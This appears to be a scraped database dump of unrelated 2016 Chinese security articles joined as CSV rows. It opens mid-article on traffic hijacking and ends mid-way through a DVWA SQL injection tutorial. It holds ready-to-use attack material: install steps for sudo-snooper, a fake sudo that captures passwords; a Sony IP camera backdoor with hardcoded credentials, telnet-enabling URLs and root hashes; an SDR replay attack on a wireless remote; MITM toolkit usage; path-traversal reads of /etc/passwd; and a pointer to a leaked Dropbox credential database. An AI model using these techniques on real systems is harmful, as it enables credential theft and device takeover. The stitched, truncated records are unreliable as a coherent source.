劫持代码根据访问来源平台的不同进行分流，推广“伪色播”病毒app百度网盟作为全国最大的广告联盟之一，每天的广告流量PV是都是以亿为单位的，其CDN缓存遭遇劫持产生的影响将非常广泛。通过分析我们确认全国只有个别地区的网络会遭遇此类劫持，我们也在第一时间将这个情况反馈给了友商方面，但造成缓存被劫持的原因没有得到最终反馈，是运营商中间劫持还是个别缓存服务器被入侵导致还不得而知，但是这个案例给我们的CDN服务的安全防护再一次给我们敲响警钟。[21] 通过流量劫持推广的“伪色播”病毒APP行为流程简图从这个案例中我们也可以看出，移动端“劫持流量”很重要的一个出口就是“伪色情”诱导，这些病毒app基本上都是通过短信暗扣、诱导支付、广告弹窗、流量暗刷以及推广安装等手段实现非法牟利。这条移动端的灰色产业链在近两年已经发展成熟，“色播”类样本也成为移动端中感染量最大的恶意app家族分类之一。[22] “伪色播”病毒APP进行诱导推广这些“伪色播”病毒APP安装以后除了各种广告推广行为外，还会在后台偷偷发送短信去定制多种运营商付费业务，并且对业务确认短信进行自动回复和屏蔽，防止用户察觉；有些还集成了第三方支付的SDK，以VIP充值等方式诱导用户付费，用户到头来没看到想要的“福利”不说，吃了黄连也只能是有苦难言。[23] 某“伪色播”病毒APP通过短信定制业务进行扣费的接口数据包[24]病毒app自动回复并屏蔽业务短信，防止用户察觉以其中某个专门做“色播诱导”业务的广告联盟为例，其背后的推广渠道多达数百个，每年用于推广结算的财务流水超过5000w元。从其旗下的某款色播病毒APP的管理后台来看，短短半年内扣费订单数据超过100w条，平均每个用户扣费金额从6~20元不等，抛开其他的流氓推广收益，仅扣费这一项的半年收益总额就过百万，而这只是海量“伪色播”病毒样本中的一个，那整个产业链的暴利收益可想而知。[25] 某“伪色播”病毒APP的扣费统计后台[26] 某“伪色播”病毒APP扣费通道的数据存储服务器3. DNS劫持路由器作为亿万用户网络接入的基础设备，其安全的重要性不言而喻。最近两年曝光的路由器漏洞、后门等案例比比皆是，主流路由器品牌基本上无一漏网。虽然部分厂商发布了修复补丁固件，但是普通用户很少会主动去更新升级路由器系统，所以路由器漏洞危害的持续性要远高于普通PC平台；另一方面，针对路由器的安全防护也一直是传统安全软件的空白点，用户路由器一旦中招往往无法察觉。国内外针对路由器的攻击事件最近两年也非常频繁，我们目前发现的攻击方式主要分为两大类，一类是利用漏洞或后门获取路由器系统权限后种植僵尸木马，一般以ddos木马居多，还兼容路由器常见的arm、mips等嵌入式平台；另一类是获取路由器管理权限后篡改默认的DNS服务器设置，通过DNS劫持用户流量，一般用于广告刷量、钓鱼攻击等。[27] 兼容多平台的路由器DDOS木马样本下面这个案例是我们近期发现的一个非常典型的dns劫持案例，劫持者通过路由器漏洞劫持用户DNS，在用户网页中注入JS劫持代码，实现导航劫持、电商广告劫持、流量暗刷等。从劫持代码中还发现了针对D-Link、TP-Link、ZTE等品牌路由器的攻击代码，利用CSRF漏洞篡改路由器DNS设置。[28] 路由器DNS流量劫持案例简图 [29] 针对d-link、tp-link、zte等品牌路由器的攻击代码被篡改的恶意DNS会劫持常见导航站的静态资源域名，例如http://s0.hao123img.com、http://s0.qhimg.com等，劫持者会在网页引用的jquery库中注入JS代码，以实现后续的劫持行为。由于页面缓存的原因，通过JS缓存投毒还可以实现长期隐蔽劫持。[30] 常见的导航站点域名被劫持 [31] 网站引用的jquery库中被注入恶意代码被注入页面的劫持代码多用来进行广告暗刷和电商流量劫持，从发现的数十个劫持JS文件代码的历史变化中，可以看出作者一直在不断尝试测试改进不同的劫持方式。[32] 劫持代码进行各大电商广告的暗刷 [33] 在网页中注入CPS广告，跳转到自己的电商导流平台我们对劫持者的流量统计后台进行了简单的跟踪，从51la的数据统计来看，劫持流量还是非常惊人的，日均PV在200w左右，在2015年末的高峰期甚至达到800w左右，劫持者的暴利收益不难想象。[34] DNS流量劫持者使用的51啦统计后台最近两年DNS劫持活动非常频繁，恶意DNS数量增长也非常迅速，我们监测到的每年新增恶意DNS服务器就多达上百个。针对路由器的劫持攻击案例也不仅仅发生在国内，从蜜罐系统和小范围漏洞探测结果中，我们也捕获到了多起全球范围内的路由器DNS攻击案例。[35] DNS流量劫持者使用的51啦统计后台[36] 在国外地区发现的一例路由器CSRF漏洞“全家桶”，被利用的攻击playload多达20多种下面的案例是2016年初我们的蜜罐系统捕获到一类针对路由器漏洞的扫描攻击，随后我们尝试进行溯源和影响评估，在对某邻国的部分活跃IP段进行小范围的扫描探测后，发现大批量的路由器被暴露在外网，其中存在漏洞的路由器有30%左右被篡改了DNS设置。抛开劫持广告流量牟利不谈，如果要对一个国家或地区的网络进行大批量的渗透或破坏，以目前路由器的千疮百孔安全现状，无疑可以作为很适合的一个突破口，这并不是危言耸听。如下图中漏洞路由器首选DNS被设置为劫持服务器IP，备选DNS服务器设为谷歌公共DNS(8.8.8.8)[37] 邻国某网段中大量存在漏洞的路由器被劫持DNS设置 [38] 各种存在漏洞的路由器被劫持DNS设置4. 神秘劫持以一个神秘的劫持案例作为故事的结尾，在工作中曾经陆续遇到过多次神秘样本，仿佛是隐藏在层层网络中的黑暗幽灵，不知道它从哪里来，也不知道它截获的信息最终流向哪里，留给我们的只有迷一般的背影。这批迷一样的样本已经默默存活了很久，我们捕获到早期变种可以追溯到12年左右。下面我们先把这个迷的开头补充下，这些样本绝大多数来自于某些可能被劫持的网络节点，请静静看图。[39] 某软件升级数据包正常状态与异常状态对比[40] 某软件升级过程中的抓包数据我们在15年初的时候捕获到了其中一类样本的新变种，除了迷一样的传播方式，样本本身还有很多非常有意思的技术细节，限于篇幅这里只能放1张内部分享的分析截图，虽然高清但是有码，同样老规矩静静看图（这里有很多值得YY的东西……）[41] 神秘样本技术分析简图【尾记】流量圈的故事还有很多，劫持与反劫持的故事在很长时间内还将继续演绎下去。流量是很多互联网企业赖以生存的基础，通过优秀的产品去获得用户和流量是唯一的正途，用户的信任来之不易，且行且珍惜。文章到此暂告一段落，有感兴趣的地方欢迎留言讨论。【引用】[1] http://wooyun.org/bugs/wooyun-2010-0168329插一条硬广（^_^）：本机构账号将持续关注和发布各类安全热点事件，欢迎大家关注我们哦！ 猎豹渔村安全局 - 知乎想查看更多过往的报告？可以点击下面哦 :-D我们的微博：渔村安全的微博我们的微信公众号：渔村安全","2017-01-14 16:30:10","网络安全","互联网黑势力之流量劫持","http://nsoad.com/Article/Network-security/20170114/1017.html"
"5ccbfb164f2f0a0a7a69c114","近日，腾讯反病毒实验室截获到了大量通过传入特殊参数实现刷流量行为的恶意程序，经过回溯发现，这些恶意程序均是由某wifi热点共享软件下载并解密运行进行传播，感染量非常","silence","0×01 信号捕获在这篇文章中，我们将使用GnuRadio+SDR硬件对某品牌型号的无线跳蛋进行无线重放攻击的演示。    市面上常见的无线遥控工作的频段，通常工作在315Mhz、433Mhz，也有少数的会采用868Mhz.915Mhz这几个频点。 我们可以用电视棒、HackRF、BladeRF等SDR硬件来确定遥控的工作频率： 打开软件按下遥控器后，能在瀑布图上看到明显的反应： osmocom_fft -F -f 433e6 -s 4e6gqrx无线遥控中心频率：4338700000×02 录制信号SDR软件通常支持录制信号，可将遥控的信号保存为wav音频文件或者以.cfile、.raw格式保存。这里用gnuradio-companion流图来实现信号录制以及信号重放。wget http://www.0xroot.cn/SDR/signal-record.grcgnuradio-companion signal-record.grc左侧osmocom Source模块调用SDR硬件，我们设置其中心频率为433.874MHz，采样率为2M:右侧上边 QT GUI Sink模块将捕获到的信号在瀑布图上展示出来，右侧下边的File Sink将录制到的信号保存为/tmp/key.raw文件：执行流图，按下遥控前：按下遥控：转到/tmp 缓存目录：0×03 信号重放接下来再用gnuradio-companion写个信号重放的流图：wget http://www.0xroot.cn/SDR/signal-replay.grcgnuradio-companion signal-replay.grc    左侧File Source调用捕获到的key.raw信号文件,osmocom Sink调用HackRF、BladeRF将信号发射出去，与此同时QT GUI Time Sink、QT GUI Frequency Sink模块分别在屏幕上显示时间轴（时间域）、频率幅度（频率域），执行流图： bingo!0×04 演示视频0×05 信号分析inspectrum key.raw信号分析&amp;转码细节参考： 如何使用SDR+inspectrum逆向分析无线遥控信号 一文。s = ''a = [0.333033, 0.326189, 0.0332124, 0.388094, 0.326704, 0.0154539, 0.322883, 0.0270275, 0.0150091, 0.443235, 0.362946, 0.027745, 0.430879, 0.443824, 0.0277048, 0.330736, 0.0290668, 0.0133217, 0.376686, 0.0123277, 0.00931546, 0.446231, 0.397617, 0.0162406, 0.447861, 0.0050071, 0.0109479, 0.389289, 0.0271959, 0.0138626, 0.32109, 0.0268736, 0.0129828, 0.401142, 0.326009, 0.0303488, 0.379368, 0.0229494, 0.0134011, 0.318115, 0.346288, 0.017666, 0.333818, 0.326769, 0.0141554, 0.341832, 0.0291055, 0.0153984, 0.446665, 0.399975, 0.024566, 0.316297, 0.0159851, 0.010876, 0.428384, 0.444201, 0.0214323, 0.376211, 0.00628675, 0.0105036, 0.44565, 0.0195615, 0.012549, 0.445242, 0.366523, 0.0225733, 0.324775, 0.0192127, 0.0134437, 0.318991, 0.381386, 0.0149852, 0.00882163, 0.447015]for i in a:    if i &gt; 0.1:        s +='1'    else:        s +='0'print s             python test.py  11011010011011010010011010010010011010011011010011010011010010011010011001pip install bitstring`pythonimport bitstringbitstring.BitArray(bin='11011010011011010010011010010010011010011011010011010011010010011010011001').tobytes() Automated RF/SDR Signal Analysis [Reverse Engineering]    Payload: \x36\x9b\x49\xa4\x9a\x6d\x34\xd2\x69\x9thanks for tresacton‘s help (GitHub)0×06 Hacking The world with watch德州仪器生产的EZ430 Chronos手表由于采用了MSP430芯片，该芯片支持发射1GHz以下频率的无线信号,覆盖市面上各种常见的无线遥控频率（315MHz、433MHz、868MHz、915MHz）:  6.1 开发环境搭建 到 TI德州仪器官网下载：(需注册账号) CCS studio (Code Composer Studio ):http://processors.wiki.ti.com/index.php/Download_CCSFET-Pro430-Lite程序:http://www.elprotronic.com/download.htmlSmartRF Studio : http://www.ti.com.cn/tool/cn/smartrftm-studio以及GitHub上面的 miChronos项目代码：http://github.com/jackokring/miChronos百度网盘：https://pan.baidu.com/s/1hsse2Niwindows 7如果不是Service Pack 1 则需下载安装Windows 7 和 Windows Server 2008 R2 Service Pack 1 (KB976932)补丁，否则无法安装 Code Composer Studio 下载地址：https://www.microsoft.com/zh-cn/download/confirmation.aspx?id=5842搭建完开发环境便可将信号Payload烧录到手表中，使用手表控制设备。","2016-10-08 13:32:34","无线安全","GnuRadio Hacking ①：使用GnuRadio+SDR破解固定码无线遥控","http://nsoad.com/Article/wifi/20161008/498.html"
"5ccbfb204f2f0a0a7a69c115","SPADE，一款安卓手机的后门控制工具，安全研究人员可以以此了解和研究安卓后门原理。首先，我们从网站www.apk4fun.com下载apk文件，如ccleaner。然后，我们安装spadegit cl","Kong","sudo-snooper是一款伪装成sudo命令的“蜜罐”脚本，可以帮助渗透测试人员进行系统密码的获取。安装步骤Option 1：在原生sodu的安装位置安装，需要root权限，并把原生sudo程序重命名# mv /usr/bin/sudo /usr/bin/somename修改sudo-snooper.py参数dumpdir = ""/tmp/.snooper""dumpfile = ""/tmp/.snooper/dump.txt""sudo = 'sudo'/usr/bin/sudo中安装python文件# install -dm755 sudo-snooper.py /usr/bin/sudo给予python执行文件权限Option 2 – alias sudo命令在当前用户shell中修改.rc文件（可能是.bashrc .zshrc等）alias sudo='python3.5 /path/to/sudo-snooper.py'使用方式运行后，伪装的sudo会向用户征询正确的密码，然后你可以在sudo vim /etc/resolv.conf中查看记录下的密码。下载地址","2016-10-22 17:50:16","安全工具","sudo-snooper：一款伪装成sudo命令的“蜜罐”脚本","http://nsoad.com/Security-tools/20161022/tools-625.html"
"5ccbfb204f2f0a0a7a69c116","0&times;00 前言偶然间，在国外网站的一篇文章中发现有提到这款中间人框架，顺藤摸瓜拿来实践一番，发现确实很可以，确实很方便，不敢独享，特来抛砖引玉，不足之处还望斧正","Kong","0×00 前言偶然间，在国外网站的一篇文章中发现有提到这款中间人框架，顺藤摸瓜拿来实践一番，发现确实很可以，确实很方便，不敢独享，特来抛砖引玉，不足之处还望斧正~0×01 工具介绍Xerosploit是一款可以进行中间人攻击的渗透测试工具包。它具有多种模块，可以进行多重有效的攻击，如拒绝服务和端口扫描、劫持等。由bettercap和nmap强力驱动。0×02 工具安装git clone https://github.com/LionSec/xerosploitcd xerosploit &amp;&amp; sudo python install.pysudo xerosploit在kali中很顺利的就安装成功了。    默认会自动列出本机的网卡信息，以备后续使用。0×03 模块介绍输入’help’来了解工具的使用。输入’scan’来扫描当前所在局域网主机信息。输入’192.168.0.102′来选定攻击目标。本地win10：192.168.0.102虚拟机kali：192.168.0.111输入’help’来查看可对目标进行攻击的模块。pscan：端口扫描dos：对目标进行dos攻击ping：对目标进行ping是否存活injecthtml：将html注入到目标访问的网站中injectjs：将javascript注入到目标访问的网站中rdownload：替换目标下载的文件sniff：嗅探目标的流量信息dspoof：将所有http流量重定向到特定ipyplay：在目标的浏览器中后台播放youtube视频（还得fq）replace：替换目标访问网站的所有图片driftnet：查看目标访问网站的所有图片move：让目标访问网站变得抖动deface：将目标访问网站的所有页面替换成自己定义的html代码0×04 模块使用这里就介绍几个好玩、方便展示的模块利用，其他的大家就慢慢探索把玩好了~~pscan模块端口默认只扫描1000个端口，调用nmap接口。injecthtml模块test.html&lt;h1 style=""font-size:50px;""&gt;hack fun&lt;/h1&gt;有图有真相。sniff模块*由于本人所在网络环境复杂，演示过程中出现win10机器无网络现象，不知道是工具缺陷问题，还是本机网卡问题？Xerosploit的作者在YouTube也有演示视频。    0×05 总结正如作者在github中介绍道：Xerosploit由bettercap和nmap提供驱动，个人觉得是神器结合体，让中间人攻击更加傻瓜化，更加方便快捷，一般用到的功能都有了，至于怎么玩，就看脑洞大不大了~","2016-11-07 14:30:00","安全工具","更便捷的中间人攻击框架Xerosploit","http://nsoad.com/Security-tools/20161107/tools-710.html"
"5ccbfb204f2f0a0a7a69c117","毋庸置疑，当今网络正在向 HTTPS（安全）内容发展。重要的域名现在他们已经将证书准备好了，他们的站点应该是有效且安全的。但是你是不是很好奇：到底能安全到何种程度？显","kong","0x00 漏洞概述1.漏洞简介Sparkjava是一款小型的web框架，它能够让你以很少的代码构建出一个java web应用。近日，某国外安全研究人员发现其存在文件遍历漏洞，可以通过该漏洞读取任意文件内容。在对这个漏洞进行复现与分析的时候，我们又发现了一些可能可以利用的地方，但是利用条件更加苛刻。2.漏洞影响Sparkjava版本 &lt; 2.5.20x01 漏洞复现1.验证环境Jdk-1.8.0_111 Apache maven 3.3.9 在写好Sparkjava代码后，在文件所在目录打开命令行，运行mvn package进行编译打包。2.漏洞复现根据官网给出的示例，我们写了一个简单的函数去复现这个漏洞:public class Hello {    public static void main(String[] args) {        staticFiles.externalLocation(“/tmp”);        get(""/"", (req, res) -&gt; {            return ""hello from sparkjava.com"";        });    }}pom.xml的配置为&lt;dependency&gt;      &lt;groupId&gt;com.sparkjava&lt;/groupId&gt;    &lt;artifactId&gt;spark-core&lt;/artifactId&gt;    &lt;version&gt;2.5&lt;/version&gt;&lt;/dependency&gt;  这里提供已经打包好的jar文件供大家下载。可以用如下命令运行:java -jar sparkexample-jar-with-dependencies.jar  我们可以通过(..\)来改变路径从而读取任意文件。如图，我们读取到/etc/passwd: 在漏洞发现者的描述中，Spark.staticFileLocation()和Spark.externalStaticFileLocation()这两个函数都存在这个问题。经过开发者测试，在IDE中运行时，两个函数都可以复现这个漏洞;运行打包好的jar包时，只有Spark.externalStaticFileLocation()这个函数可以触发漏洞。0x02 补丁分析与深入研究1.补丁分析很明显，在漏洞被发现时，官方没有对url中的路径做任何处理。在漏洞被修补之后，官方推出了新的版本2.5.2。这里我们对比之前的版本，并且通过调试，尝试分析官方的修补方案。 官方修补链接(https://github.com/perwendel/spark/commit/efcb46c710e3f56805b9257a63d1306882f4faf9) 当我们正常请求时：curl ""127.0.0.1:4567/l.txt""  跟到关键代码处，我们可以看到在判断文件是否存在之后，官方添加了DirectoryTraversal.protectAgainstInClassPath(resource.getPath());进行判断。 这里，path就是我们HTTP请求的地址，addedPath就是我们通过staticFiles.externalLocation()函数设置的路径与path拼接之后的值，resource中的file的值就是addedPath值经过路径的处理的值(例如：/tmp/test/..\l.txt先将所有的\换成/，再对路径进行处理，最后结果为/tmp/l.txt),resource.getPath()就是addedPath的值。在protectAgainstInClassPath()函数中，需要判断removeLeadingAndTrailingSlashesFrom(path).startsWith(StaticFilesFolder.external())是否为false，为false就抛出。removeLeadingAndTrailingSlashesFrom(path)为新添加的函数，作用是将path首尾的/去掉和将尾部的\去掉。在这里经过处理之后，path的值为tmp/l.txt。StaticFilesFolder.external()则是返回external的值，在这里就是tmp。如果removeLeadingAndTrailingSlashesFrom(path）前面的字母是tmp，则进入下一步。综上所述，官方通过比较经过处理后的路径的开头和我们设置的externalLocation()的路径是否相同来防止我们利用..\读取任意文件。2.深入探究我们修改了pom.xml，使用新的Sparkjava版本进行编译尝试，做了如下探究。&lt;dependency&gt;      &lt;groupId&gt;com.sparkjava&lt;/groupId&gt;    &lt;artifactId&gt;spark-core&lt;/artifactId&gt;    &lt;version&gt;2.5.2&lt;/version&gt;&lt;/dependency&gt;  ① 软链接的利用与Sparkjava(CVE-2016-9177)同时爆出来的一个漏洞GitLab的任意文件读取(CVE-2016-9086)是利用软链接的特性，我们就顺手测试了软链接在Sparkjava下的利用。 直接读取文件:路径映射:怎么才能利用软链接呢？这里的利用条件比较苛刻。笔者想到了两种途径： 1.网站允许上传压缩包，上传后解压并且还能访问到解压后的文件才能利用 2.网站通过wget(wget配置文件中需要retr-symlinks=on)从ftp上下载文件并且能够访问到下载的文件。②再次读取文件我们在根目录下新建两个文件tmp.txt，tmp2.txt 再访问读取到了tmp.txt和tmp2.txt的内容。 我们分析一下能够再次读取的原因，当我们请求为：curl “127.0.0.1:4567/tmp\..\..\tmp.txt”  分析过滤代码处：addedPath的值为/tmp/tmp/..\..\tmp.txt，经过处理后resource中的file值为/tmp.txt，对于下面的函数removeLeadingAndTrailingSlashesFrom(path).startsWith(StaticFilesFolder.external())，由于tmp.txt也是由tmp开头，所以判断可以通过，进而读取到tmp.txt。同样的道理，我们也可以读取到/tmp2/test.txt的内容。通过以上分析，笔者认为这个读取很鸡肋，首先staticFiles.externalLocation()中定义的路径只能是一级路径，其次我们要读取的文件的完整路径开头必须和staticFiles.externalLocation()中定义的路径相同。这就限制了这个新的读取，也许只有在某些特定的场合才能有奇效。如有错误，欢迎指正:)0x03 参考链接1.https://www.seebug.org/vuldb/ssvid-925172.http://seclists.org/fulldisclosure/2016/Nov/133.https://github.com/perwendel/spark/commit/efcb46c710e3f56805b9257a63d1306882f4faf94.https://github.com/perwendel/spark/issues/7005.http://sparkjava.com/documentation.html","2016-11-17 14:51:03","Web安全","Sparkjava Framework 文件遍历漏洞(CVE-2016-9177)分析与探究","http://nsoad.com/Article/web/20161117/794.html"
"5ccbfb204f2f0a0a7a69c118","whatportis是一款可以通过服务查询默认端口，或者是通过端口查询默认服务的工具，简单易用。在渗透测试过程中，如果需要查询某个端口绑定什么服务器，或者某个应用绑定的默","Kender","whatportis是一款可以通过服务查询默认端口，或者是通过端口查询默认服务的工具，简单易用。在渗透测试过程中，如果需要查询某个端口绑定什么服务器，或者某个应用绑定的默认端口，可以使用whatportis查询。软件安装：pip install whatportis使用教程：1.查询5432端口whatportis 54322.使用json格式显示查询结果whatportis 5432 --json3.whatportis 同样支持LIKE查询whatportis mysql --like项目地址：https://github.com/ncrocfer/whatportis","2016-11-03 05:13:25","安全工具","whatportis：一款端口服务查询工具","http://nsoad.com/Security-tools/20161103/tools-682.html"
"5ccbfb204f2f0a0a7a69c119","美国云存储服务商Dropbox周三确认，2012年时发现并披露的一次数据泄露事故影响要比之前预计的更严重。有报道称，此次数据泄露事故影响了近6800万帐号。","silence","美国云存储服务商Dropbox周三确认，2012年时发现并披露的一次数据泄露事故影响要比之前预计的更严重。有报道称，此次数据泄露事故影响了近6800万帐号。Dropbox强制重置用户密码 不需要任何花费，你就能得到黑客公布在网上的完整Dropbox泄露数据库。在今年8月，云存储服务商Dropbox超过6800万用户账户凭证的数据库被公布在网上。Dropbox发现此次公布的泄露数据与2012年提到的泄露数据十分相似，因此对泄露数据内匹配到的用户进行了密码重置。在老用户登陆Dropbox网站时，他们可能会收到创建新密码的提示。Dropbox将向满足条件的用户开启主动提醒，提醒他们进行密码重置或升级。此外，满足以下条件的用户将会被强制重置：在2012年年中注册Dropbox的用户在2012年年中以来没有修改过密码的用户官方声音Dropbox的公关部门和安全部门负责人帕特里克·海姆（PatrickHeim）表示：“我们可以确认，密码重置保护机制已经覆盖全部受影响的用户，这些用户大多都是在2012年年中之前创建的Dropbox账号。在今年9月，一个名为Double Flag的黑客在黑市平台TheRealDeal上标价2比特币（大约1200美元）公开出售Dropbox数据库。另据hackread.com的数据显示，这个数据库包含了68679804个账户凭证，既有用户的邮箱，还有encrypted加密的密码。数据显示，36814524组密码使用SHA-1加密，大约3200万组密码使用BCrypt杂凑加密。Dropbox数据如何泄露？消息人士声称，黑客通过LinkedIn获得了Dropbox员工的账号和密码，并使用这一密码访问了Dropbox的企业网，从而获取了用户的密码。因此，问题并不完全出在 Dropbox 方面。不过，这仍然违反了 Dropbox 内部的信息安全标准，并表明员工重复使用同一账号密码的问题已经影响了企业环境。托马斯.怀特（Thomas White），一个俗称恶魔的黑客，在网上公布了被泄露用户全部的文档。此外，该黑客还发表了一篇文章，名为《一个时代的终结》来对一些公司发起了挑战。其他公司如何应对？在2012年，LinkedIn发生了数据泄露，导致了大约650万人的密码被重置。随后，LinkedIn禁用了一些可能受影响的账号密码。在2014年，eBay也发生了数据泄露事件，事件发生后，eBay通过邮件提醒用户修改密码，这也导致了eBay的1.45亿的活跃用户受到了钓鱼攻击的危险。面对黑客攻击，互联网公司并没有统一的应对措施和标准，但是重置密码将会存在法律和用户体验度方面的风险。Dropbox data 下载地址：BT种子下载","2016-10-09 11:31:30","网络安全","Dropbox先前泄露的6800万账号，已可随意下载","http://nsoad.com/Article/Network-security/20161009/505.html"
"5ccbfb204f2f0a0a7a69c11a","索尼生产的80款网络摄像头中存在硬编码的登陆凭证信息，由于是静态的身份凭证，一旦被破解，就可以被Mirai等恶意软件用来控制设备，从而发动大规模的DDoS攻击。","kong","索尼生产的80款网络摄像头中存在硬编码的登陆凭证信息，由于是静态的身份凭证，一旦被破解，就可以被Mirai等恶意软件用来控制设备，从而发动大规模的DDoS攻击。这些存在漏洞的摄像头都来自Sony Professional Ipela Engine系列的IP摄像头。这些摄像头都是索尼针对专业市场的安全摄像头，价格都比较高，用户群体主要是企业和政府机关。上面提到的硬编码的身份凭证信息，本质上可算是“秘密后门”。奥地利信息安全公司SEC Consult的Stefan Viehböck于10月发现了该后门，并于昨日公布研究报告。索尼官方则已经放出固件更新修复了后门问题，并对SEC Consult表示了感谢。摄像头内包含后门原来的固件中，web版的管理控制台包含两个经过硬编码并且永久开启的账号，分别是用户名debug/密码popeyeConnection；用户名primana/密码primana，后者能够用来开启Telnet访问，甚至能够通过一条命令得到摄像头的管理员权限。在那些更晚上市的摄像头型号，还能够开启SSH服务器。比如如果从存在漏洞的设备访问了以下两个地址，telnet就会被开启：http://primana:primana@HOST/command/prima-factory.cgi?foo=bar&amp;Telnet=zKw2hEr9http://primana:primana@HOST/command/prima-factory.cgi?foo=bar&amp;Telnet=cPoq2fi4cFk访问上面这两个地址，会触发这些摄像头中第五代Ipela Engine摄像头的prima-factory.cgi程序，通过启动inetd开启后门，摄像头会设置在23端口运行telnet进程。而第六代摄像头的关键字符串为”himitunokagi”，也就是日语中的“秘密の鍵”（密钥）。一旦开启了telnet/ssh服务，攻击者只需破解以下密码哈希就可以以root身份登陆，并且通过命令行进入操作系统：$1$$mhF8LHkOmSgbD88/WrM790 (第五代)iMaxAEXStYyd6 (第六代)  SEC Consult认为黑客有能力破解root登陆密码，因此建议广大用户及时升级到最新版本的固件。“我们没有花时间去破解root密码，但这仅仅是时间和计算能力的问题，最终还是有人会破解出来的。”SEC Consult漏洞实验室负责人Johannes Greil说道。索尼的这些摄像头设备中还有一个默认的用户名密码组合：admin/admin，这个组合可以用在web端的控制台中——这是比较常见的默认用户名密码组合。除此之外，primana账号能够开启一些设备测试的功能，而debug账户能开启什么功能SEC Consult还有待研究。影响范围受影响的信号使用的固件版本是1.82.01（第五代）之前，或是2.7.0（第六代）之前。固件版本1.86.00和2.7.2中包含了补丁。所涉及的具体型号如下：    SNC-CX600, SNC-CX600W, SNC-EB600, SNC-EB600B, SNC EB602R, SNC-EB630, SNC-EB630B, SNC-EB632R, SNC-EM600, SNC-EM601, SNC-EM602R, SNC-EM602RC, SNC-EM630, SNC-EM631, SNC-EM632R, SNC-EM632RC, SNC-VB600, SNC-VB600B, SNC-VB600B5, SNC-VB630, SNC-VB6305, SNC-VB6307,        SNC-VB632D, SNC-VB635, SNC-VM600, SNC-VM600B, SNC-VM600B5, SNC-VM601, SNC-VM601B, SNC-VM602R, SNC-VM630, SNC-VM6305, SNC-VM6307, SNC-VM631, SNC-VM632R, SNC-WR600, SNC-WR602, SNC-WR602C, SNC-WR630, SNC-WR632, SNC-WR632C, SNC-XM631, SNC-XM632, SNC-XM636,        SNC-XM637, SNC-VB600L, SNC-VM600L, SNC-XM631L, SNC-WR602CL, SNC-CH115, SNC-CH120, SNC-CH160, SNC-CH220, SNC-CH260, SNC-DH120, SNC-DH120T, SNC-DH160, SNC-DH220, SNC-DH220T, SNC-DH260, SNC-EB520, SNC-EM520, SNC-EM521, SNC-ZB550, SNC-ZM550, SNC-ZM551,        SNC-EP550, SNC-EP580, SNC-ER550, SNC-ER550C, SNC-ER580, SNC-ER585, SNC-ER585H, SNC-ZP550, SNC-ZR550, SNC-EP520, SNC-EP521, SNC-ER520, SNC-ER521, SNC-ER521C索尼于11月28日针对所有受影响的摄像头产品发布了固件更新。从Censys.io搜索结果来看，大约有4000台索尼安全摄像头连接到互联网——这应该并不是所有用户数量。是否有所以摄像头感染恶意程序，目前仍不得而知。要知道像Mirai这样的僵尸网络肆虐的当下，各种IoT设备，包括摄像头、路由器等本身都处在风险中。最近名为BestBuy的黑客还宣称已经控制了320万台家用路由器，并且将为这些路由器推送恶意固件升级。他甚至还扬言说：这些设备都是我们的，重启也没用。除非将设备扔到垃圾桶，否则僵尸犹在！IoT设备的安全问题已经到了全面爆发的时刻。","2016-12-08","漏洞发布","索尼80款监控摄像头存秘密后门，IoT设备的加速沦陷","http://nsoad.com/Article/exploit/20161208/vulzone-44.html"
"5ccbfb204f2f0a0a7a69c11b","目前，最新的DVWA已经更新到1.9版本（http://www.dvwa.co.uk/），而网上的教程大多停留在旧版本，且没有针对DVWA high级别的教程，因此萌发了一个撰写新手教程的想法，错误的地方还请大家指正。","Kong","目前，最新的DVWA已经更新到1.9版本（http://www.dvwa.co.uk/），而网上的教程大多停留在旧版本，且没有针对DVWA high级别的教程，因此萌发了一个撰写新手教程的想法，错误的地方还请大家指正。DVWA简介DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。DVWA共有十个模块，分别是Brute Force（暴力（破解））Command Injection（命令行注入）CSRF（跨站请求伪造）File Inclusion（文件包含）File Upload（文件上传）Insecure CAPTCHA （不安全的验证码）SQL Injection（SQL注入）SQL Injection（Blind）（SQL盲注）XSS（Reflected）（反射型跨站脚本）XSS（Stored）（存储型跨站脚本）需要注意的是，DVWA 1.9的代码分为四种安全级别：Low，Medium，High，Impossible。初学者可以通过比较四种级别的代码，接触到一些PHP代码审计的内容。DVWA的搭建Freebuf上的这篇文章《新手指南：手把手教你如何搭建自己的渗透测试环境》（http://www.freebuf.com/sectool/102661.html）已经写得非常好了，在这里就不赘述了。 Brute ForceCommand InjectionCSRFFile InclusionFile UploadInsecure CAPTCHA本文介绍SQL Injection模块的相关内容，后续教程会在之后的文章中给出。SQL InjectionSQL Injection，即SQL注入，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。SQL注入漏洞的危害是巨大的，常常会导致整个数据库被“脱裤”，尽管如此，SQL注入仍是现在最常见的Web漏洞之一。近期很火的大使馆接连被黑事件，据说黑客依靠的就是常见的SQL注入漏洞。手工注入思路自动化的注入神器sqlmap固然好用，但还是要掌握一些手工注入的思路，下面简要介绍手工注入（非盲注）的步骤。1.判断是否存在注入，注入是字符型还是数字型2.猜解SQL查询语句中的字段数3.确定显示的字段顺序4.获取当前数据库5.获取数据库中的表6.获取表中的字段名7.下载数据下面对四种级别的代码进行分析。Low服务器端核心代码&lt;?php if( isset( $_REQUEST[ 'Submit' ] ) ) {     // Get input     $id = $_REQUEST[ 'id' ];     // Check database     $query  = ""SELECT first_name, last_name FROM users WHERE user_id = '$id';"";     $result = mysql_query( $query ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );     // Get results     $num = mysql_numrows( $result );     $i   = 0;     while( $i &lt; $num ) {         // Get values         $first = mysql_result( $result, $i, ""first_name"" );         $last  = mysql_result( $result, $i, ""last_name"" );         // Feedback for end user         echo ""&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;"";         // Increase loop count         $i++;     }     mysql_close(); } ?&gt; 可以看到，Low级别的代码对来自客户端的参数id没有进行任何的检查与过滤，存在明显的SQL注入。漏洞利用现实攻击场景下，攻击者是无法看到后端代码的，所以下面的手工注入步骤是建立在无法看到源码的基础上。1.判断是否存在注入，注入是字符型还是数字型输入1，查询成功：输入1’and ‘1’ =’2，查询失败，返回结果为空：输入1’or ‘1234 